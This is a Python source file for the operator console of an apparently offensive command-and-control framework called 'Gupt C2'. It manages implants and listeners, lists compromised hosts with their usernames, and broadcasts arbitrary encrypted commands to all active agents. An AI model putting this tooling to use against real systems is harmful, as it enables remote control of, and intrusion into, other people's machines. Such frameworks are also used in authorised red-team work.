"""
Enhanced main menu with multi-agent support
"""
from Core import color, database, helper
from Core.agentmanager import agent_manager
from functions import listenerfunctions, implantfunctions, interactfunctions
from tabulate import tabulate
import os


def interact_menu(conn, command):
    """Handle interact command"""
    parts = command.split()
    if len(parts) < 2:
        print("[%s] Usage: interact <agent_name>" % color.red("-"))
        return
    
    agent_name = parts[1]
    results = database.return_key(conn, agent_name)
    
    if results:
        interactfunctions.interact(conn, command)
    else:
        print("[%s] Agent '%s' not found!" % (color.red("-"), agent_name))
        # Show available agents
        agents = database.list_implant(conn)
        if agents:
            print("[%s] Available agents: %s" % (color.blue("*"), ", ".join([a[0] for a in agents])))


def implant_menu(conn, command):
    """Handle implant commands"""
    if command[:16] == "implant generate":
        implantfunctions.GenerateImplant(conn, command)
    elif command == "implant list":
        implantfunctions.ListImplant(conn)
    elif command[:14] == "implant remove":
        parts = command.split()
        if len(parts) >= 3:
            implantfunctions.StopImplant(conn, parts[2])
            print("[%s] Implant removed" % color.green("+"))
        else:
            print("[%s] Usage: implant remove <name>" % color.red("-"))


def listener_menu(conn, command):
    """Handle listener commands"""
    if command[:14] == "listener start":
        listenerfunctions.StartListener(command, conn)
    elif command[:13] == "listener stop":
        listenerfunctions.StopListener(command, conn)
    elif command[:13] == "listener load":
        listenerfunctions.ReloadListener(conn)
    elif command[:13] == "listener list":
        listenerfunctions.ListListener(conn)


def agents_menu(conn, command):
    """Handle agents management commands"""
    parts = command.split()
    
    if len(parts) == 1 or parts[1] == "list":
        # List all agents
        list_all_agents(conn)
    elif parts[1] == "active":
        # List only active agents
        list_active_agents(conn)
    elif parts[1] == "kill" and len(parts) >= 3:
        # Kill/remove an agent
        agent_name = parts[2]
        kill_agent(conn, agent_name)
    else:
        print("[%s] Unknown agents command. Use 'help agents' for help." % color.yellow("!"))


def list_all_agents(conn):
    """Display all registered agents with detailed info"""
    # Get from database
    db_agents = database.list_all_implants(conn)
    
    if not db_agents:
        print("[%s] No agents registered" % color.yellow("!"))
        return
    
    data = []
    for agent in db_agents:
        name = agent[0]
        active = "Active" if agent[1] else "Inactive"
        hostname = agent[2] or "Unknown"
        username = agent[3] or "Unknown"
        local_ips = agent[4] or "Unknown"
        last_seen = agent[5] or "Never"
        sleep_time = agent[6] or 5
        
        # Check in-memory status
        mem_agent = agent_manager.get_agent(name)
        if mem_agent:
            status = mem_agent.get_status()
            active = status['status']
            if status['last_seen'] != "Never":
                last_seen = status['last_seen']
        
        # Color code status
        if active == "Active":
            active_colored = color.green(active)
        elif active == "Stale":
            active_colored = color.yellow(active)
        else:
            active_colored = color.red(active)
        
        data.append([
            color.cyan(name),
            active_colored,
            hostname,
            username,
            last_seen,
            str(sleep_time) + "s"
        ])
    
    print("\n", tabulate(data, headers=[
        color.red("Name"), 
        color.red("Status"), 
        color.red("Hostname"),
        color.red("Username"), 
        color.red("Last Seen"),
        color.red("Sleep")
    ], tablefmt="fancy_grid"), "\n")


def list_active_agents(conn):
    """Display only active agents"""
    agents = agent_manager.get_active_agents()
    
    if not agents:
        print("[%s] No active agents" % color.yellow("!"))
        return
    
    data = []
    for agent in agents:
        status = agent.get_status()
        data.append([
            color.cyan(status['name']),
            color.green("Active"),
            status['hostname'] or "Unknown",
            status['username'] or "Unknown",
            status['last_seen']
        ])
    
    print("\n", tabulate(data, headers=[
        color.red("Name"), 
        color.red("Status"), 
        color.red("Hostname"),
        color.red("Username"), 
        color.red("Last Seen")
    ], tablefmt="fancy_grid"), "\n")


def kill_agent(conn, agent_name):
    """Kill/remove an agent"""
    from Core import encryption
    
    key_result = database.return_key(conn, agent_name)
    if not key_result:
        print("[%s] Agent '%s' not found" % (color.red("-"), agent_name))
        return
    
    key = key_result[0][0]
    
    # Send exit command
    enc_command = encryption.EncryptString("exit", key)
    agent_manager.queue_task(agent_name, enc_command)
    
    # Also save to file for backwards compat
    try:
        os.makedirs("data/implant/%s" % agent_name, exist_ok=True)
        with open("data/implant/%s/tasks.enc" % agent_name, "w") as f:
            f.write(enc_command)
    except:
        pass
    
    print("[%s] Exit command sent to %s" % (color.green("+"), agent_name))


def broadcast_command(conn, command):
    """Broadcast a command to all active agents"""
    from Core import encryption
    
    parts = command.split(maxsplit=1)
    if len(parts) < 2:
        print("[%s] Usage: broadcast <command>" % color.red("-"))
        return
    
    cmd_to_send = parts[1]
    
    # Get all active agents
    active_agents = database.list_implant(conn)
    
    if not active_agents:
        print("[%s] No active agents to broadcast to" % color.yellow("!"))
        return
    
    count = 0
    for agent in active_agents:
        agent_name = agent[0]
        key_result = database.return_key(conn, agent_name)
        
        if key_result:
            key = key_result[0][0]
            enc_command = encryption.EncryptString(cmd_to_send, key)
            
            # Queue to agent manager
            agent_manager.queue_task(agent_name, enc_command)
            
            # Also file-based for backwards compat
            try:
                os.makedirs("data/implant/%s" % agent_name, exist_ok=True)
                with open("data/implant/%s/tasks.enc" % agent_name, "w") as f:
                    f.write(enc_command)
            except:
                pass
            
            count += 1
            print("[%s] Task queued for %s" % (color.green("+"), color.cyan(agent_name)))
    
    print("\n[%s] Broadcast sent to %d agents" % (color.green("+"), count))


def start(conn):
    """Main command loop"""
    while True:
        try:
            command = input("[%s%s%s]%s " % (
                color.red("Gupt"), 
                color.yellow("@"), 
                color.cyan("C2"), 
                color.yellow("::>")
            )).strip()
            
            if not command:
                continue
            
            # Help commands
            if command == "help":
                print("\n%s\n" % helper.help())
            
            elif command == "help listener":
                print("\n%s\n" % helper.help_listener())
            
            elif command == "help implant":
                print("\n%s\n" % helper.help_implant())
            
            elif command == "help interact":
                print("\n%s\n" % helper.help_interact())
            
            elif command == "help agents":
                print("\n%s\n" % helper.help_agents())
            
            elif command == "help execute-assembly":
                print(helper.help_execute_assembly())
            
            elif command == "help shellcode":
                print(helper.help_shellcode())
            
            # Clear screen
            elif command == "clear":
                os.system('cls' if os.name == 'nt' else 'clear')
            
            # List commands
            elif command == "list listener":
                print("\n%s\n" % helper.list_listener_option())
            
            elif command == "list implant":
                print("\n%s\n" % helper.list_implant_lang())
            
            # Listener management
            elif command[:8] == "listener":
                listener_menu(conn, command)
            
            # Implant management
            elif command[:7] == "implant":
                implant_menu(conn, command)
            
            # Agent management (new)
            elif command[:6] == "agents":
                agents_menu(conn, command)
            
            # Broadcast command (new)
            elif command[:9] == "broadcast":
                broadcast_command(conn, command)
            
            # Interact with agent
            elif command[:8] == "interact":
                interact_menu(conn, command)
            
            # Exit
            elif command == "exit" or command == "quit":
                print("[%s] Goodbye!" % color.green("+"))
                exit()
            
            else:
                print("[%s] Unknown command. Type 'help' for available commands." % color.yellow("!"))
        
        except KeyboardInterrupt:
            print("\n[%s] Use 'exit' to quit" % color.yellow("!"))
        except Exception as e:
            print("[%s] Error: %s" % (color.red("-"), str(e)))
